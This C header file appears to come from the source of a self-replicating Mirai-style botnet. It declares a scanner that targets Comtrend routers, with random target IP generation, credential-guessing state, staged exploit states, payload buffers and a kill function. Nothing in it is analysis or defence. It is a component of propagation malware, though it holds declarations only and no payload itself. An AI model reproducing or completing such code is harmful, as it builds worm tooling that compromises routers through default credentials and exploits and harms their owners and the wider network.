#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#define comtrend_SCANNER_MAX_CONNS   256
#define comtrend_SCANNER_RAW_PPS     1024

#define comtrend_SCANNER_RDBUF_SIZE  1080
#define comtrend_SCANNER_HACK_DRAIN  64

struct comtrend_scanner_connection
{
    int fd, last_recv;
    enum
    {
        comtrend_SC_CLOSED,
        comtrend_comtrend_SC_CONNECTING,
        comtrend_SC_GET_CREDENTIALS,
        comtrend_SC_EXPLOIT_STAGE2,
        comtrend_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[comtrend_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[256], payload_buf2[256];
    int credential_index;
};

void comtrend_scanner();
void comtrend_kill(void);

static void comtrend_setup_connection(struct comtrend_scanner_connection *);
static ipv4_t get_random_comtrend_ip(void);

#endif
